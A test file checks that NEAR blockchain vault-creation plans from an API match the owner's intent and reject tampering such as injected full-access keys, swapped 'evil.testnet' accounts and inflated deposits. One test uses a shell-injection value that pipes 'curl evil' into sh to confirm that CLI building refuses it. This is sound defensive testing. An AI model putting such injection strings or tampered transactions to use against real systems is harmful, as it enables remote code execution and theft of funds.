// @vitest-environment node
import { describe, expect, it } from 'vitest'
import { checkPlan, planCli } from './vaultPlan'
import type { PlanIntent } from './vaultPlan'

const want: PlanIntent = {
  owner: 'acme.testnet',
  name: 'shop',
  vendor: 'agentco.testnet',
  token: 'tusdc.ss-owner-e9c3db.testnet',
  fundYocto: '1500000000000000000000000',
  codeHash: '5pxQNdWnhTJiaTKs6HrVv4SadLi1tWuACeeYmyaxgHAs',
  caps: {},
  capCeiling: '10000000000',
  storageMinYocto: '1250000000000000000000',
}

const policy = {
  daily_cap: '5000000',
  max_per_payment: '2000000',
  max_new_payees_per_day: 5,
  payee_delay: '3600000000000',
  limits_delay: '86400000000000',
  key_allowance: '250000000000000000000000',
  key_nonces: 4,
  min_near_float: '500000000000000000000000',
  max_payments_per_day: 20,
  max_decisions_per_day: 100,
  batch_size: 3,
  batch_interval: '21600000000000',
  test_ttl: '43200000000000',
  reveal_grace: '21600000000000',
  rearm_cooldown: '3600000000000',
  min_answer: '14400000000000',
  storage_deposit: '1250000000000000000000',
}

// The plan shape from backend/API.md
const good = () => ({
  signerId: 'acme.testnet',
  transactions: [
    {
      receiverId: 'shop.acme.testnet',
      actions: [
        { type: 'CreateAccount' },
        { type: 'Transfer', params: { deposit: want.fundYocto } },
        {
          type: 'UseGlobalContract',
          params: { contractIdentifier: { codeHash: want.codeHash } },
        },
        {
          type: 'FunctionCall',
          params: {
            methodName: 'new',
            args: {
              owner_id: 'acme.testnet',
              vendor_id: 'agentco.testnet',
              token_id: want.token,
              intents_id: null,
              policy: { ...policy },
            },
            gas: '50000000000000',
            deposit: '0',
          },
        },
      ],
    },
    {
      receiverId: want.token,
      actions: [
        {
          type: 'FunctionCall',
          params: {
            methodName: 'storage_deposit',
            args: { account_id: 'shop.acme.testnet', registration_only: true },
            gas: '30000000000000',
            deposit: want.storageMinYocto,
          },
        },
      ],
    },
  ],
})

type Plan = ReturnType<typeof good>
const tamper = (f: (p: any) => void) => {
  const p: Plan = good()
  f(p)
  return () => checkPlan(p as any, want)
}

describe('vault plans from the API are checked against the owner intent', () => {
  it('accepts the documented plan and computes the total itself', () => {
    const c = checkPlan(good() as any, want)
    expect(c.vaultId).toBe('shop.acme.testnet')
    expect(c.totalYocto).toBe('1501250000000000000000000')
  })

  it('hands the wallet rebuilt transactions, never the API objects', () => {
    const p = good() as any
    p.transactions[0].actions[3].params.extra = 'smuggled'
    const c = checkPlan(p, want)
    expect(c.transactions).not.toBe(p.transactions)
    expect(JSON.stringify(c.transactions)).not.toContain('smuggled')
  })

  it('refuses every kind of tampering', () => {
    const bad = [
      tamper((p) =>
        p.transactions[0].actions.push({
          type: 'AddKey',
          params: {
            publicKey: 'ed25519:x',
            accessKey: { permission: 'FullAccess' },
          },
        }),
      ),
      tamper((p) =>
        p.transactions.push({ receiverId: 'evil.testnet', actions: [] }),
      ),
      tamper((p) => (p.transactions[0].actions[1].params.deposit = '1')),
      tamper(
        (p) =>
          (p.transactions[0].actions[2].params.contractIdentifier.codeHash =
            '11111111111111111111111111111111111111111111'),
      ),
      tamper(
        (p) =>
          (p.transactions[0].actions[3].params.args.owner_id = 'evil.testnet'),
      ),
      tamper(
        (p) =>
          (p.transactions[0].actions[3].params.args.vendor_id = 'evil.testnet'),
      ),
      tamper(
        (p) =>
          (p.transactions[0].actions[3].params.args.intents_id =
            'intents.near'),
      ),
      tamper(
        (p) =>
          (p.transactions[0].actions[3].params.args.policy.payee_delay = '0'),
      ),
      tamper(
        (p) =>
          (p.transactions[0].actions[3].params.args.policy.key_allowance =
            '5000000000000000000000000'),
      ),
      tamper((p) => (p.transactions[0].actions[3].params.deposit = '1')),
      tamper(
        (p) =>
          (p.transactions[1].actions[0].params.deposit =
            '1000000000000000000000000'),
      ),
      tamper(
        (p) =>
          (p.transactions[1].actions[0].params.args.account_id =
            'evil.testnet'),
      ),
      tamper((p) => (p.signerId = 'evil.testnet')),
      tamper(
        (p) =>
          (p.transactions[0].actions[2].params.contractIdentifier.accountId =
            'evil.testnet'),
      ),
      tamper(
        (p) =>
          (p.transactions[0].actions[3].params.args.policy.rearm_cooldown =
            '99999999999999999999'),
      ),
      tamper(
        (p) =>
          (p.transactions[0].actions[3].params.args.policy.daily_cap =
            '1000000000000000000000000000000'),
      ),
    ]
    for (const run of bad) expect(run).toThrow()
  })

  it('enforces the caps the owner typed', () => {
    expect(() =>
      checkPlan(good() as any, { ...want, caps: { daily_cap: '9000000' } }),
    ).toThrow('daily cap')
  })

  it('builds CLI commands only from checked values', () => {
    const c = checkPlan(good() as any, want)
    const [create, register] = planCli(c, want, 'testnet')
    expect(create).toContain('use-global-hash ' + want.codeHash)
    expect(register).toContain(
      `attached-deposit '${want.storageMinYocto} yoctonear'`,
    )
    const quoted = checkPlan(good() as any, want)
    quoted.policy = { ...quoted.policy, note: "x' ; curl evil | sh ; '" }
    expect(() => planCli(quoted, want, 'testnet')).toThrow()
  })
})
